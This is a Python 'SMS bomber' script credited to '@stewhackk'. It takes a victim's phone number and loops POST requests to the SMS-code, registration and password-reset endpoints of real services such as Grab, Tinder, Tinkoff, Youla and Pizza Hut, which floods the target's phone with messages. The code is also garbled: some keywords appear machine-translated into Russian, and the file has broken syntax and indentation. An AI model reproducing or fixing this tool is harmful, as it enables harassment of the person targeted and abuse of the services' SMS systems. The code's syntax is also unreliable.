import threading 
import time 
import request, random, datetime, sys, time, argparse, os

print(""" 
╭━━━╮╱╱╱╱╱╱╱╱╭╮╭╮ 
╰╮╭╮┃╱╱╱╱╱╱╱╭╯╰┫┃ 
╱┮┃┃┣┣┣ ┫╰━╮ 
╱┃┃┃┃┃━┫╭╮┃┃┃┃┃┃╭╮┃ 
╭╯╰╯┃┃━┫╭╮┃╰╯┃╰┫┃┃┃ ╰━━━ 
┻━━┻ ┻━━┻ ╯╰┻━━┻━┻╯╰╯ by @stewhackk""")
phone = input("\033[32m Введите номер +")
def qw(_phone): 
    if _phone[0] == '+': 
        _phone = _phone[1:] 
    if _phone[0] == '8': 
        _phone = '7'+_phone[1:] 
    if _phone[0 ] == '9': 
        _phone = '7'+_phone 
_phone = phone 
    _name = '' 
    для x в истории (12): 
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM')) 
        password = _name + random. выбор('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM')) 
        имя пользователя = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM')) 

    _19: = _phone
    _phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[ 9:11] 
    _phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10] 
    _phoneOstin = '+'+ _phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] 
    _phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11] ] ] 
    _phoneГорздрав = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] 
    s = 
    0ечение = 0 
    пока Верно: 
        _email = _name+f'{итерация}'+'@gmail.com'
        электронная почта = _name+f'{итерация}'+'@gmail.com'

try:
            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
        except:
            s=s
        try:
            requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
        except:
            s=s

        try:
            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
        except:
            s=s

        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
        except:
            s=s

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
        except:
            s=s

        try:
            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
        except:
            s=s
try:
            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
        except:
            s=s

        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
        except:
            s=s

        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
        except:
            s=s

        try:
            requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
        except:
            s=s